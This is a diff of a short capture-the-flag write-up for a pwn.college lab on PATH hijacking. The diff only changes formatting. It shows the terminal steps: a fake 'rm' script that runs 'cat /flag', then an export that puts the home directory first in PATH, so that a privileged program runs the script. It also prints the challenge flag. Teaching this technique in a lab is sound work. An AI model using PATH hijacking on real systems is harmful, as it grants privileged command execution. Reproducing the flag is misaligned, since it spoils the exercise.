@@ -4,16 +4,16 @@
 
 I passed _/bin/cat /flag_ to the shell script named rm to override the existing rm command and set PATH variable using export command. I ran _/challenge/run_ to get the flag.
 
-    _hacker@path-hijacking-commands:~$ nano rm_
+    hacker@path-hijacking-commands:~$ nano rm
 
-    _hacker@path-hijacking-commands:~$ chmod +x rm_
+    hacker@path-hijacking-commands:~$ chmod +x rm
 
-    _hacker@path-hijacking-commands:~$ export PATH=/home/hacker:$PATH_
+    hacker@path-hijacking-commands:~$ export PATH=/home/hacker:$PATH
 
-    _hacker@path-hijacking-commands:~$ /challenge/run_
+    hacker@path-hijacking-commands:~$ /challenge/run
 
-    _Trying to remove /flag..._
+    Trying to remove /flag...
 
-    _Found 'rm' command at /home/hacker/rm. Executing!_
+    Found 'rm' command at /home/hacker/rm. Executing!
 
-    _pwn.college{4OTTYvM-A2YpCEUhyVE_9hl3S4x.ddzNyUDL1cTN0czW}_
+    pwn.college{4OTTYvM-A2YpCEUhyVE_9hl3S4x.ddzNyUDL1cTN0czW}
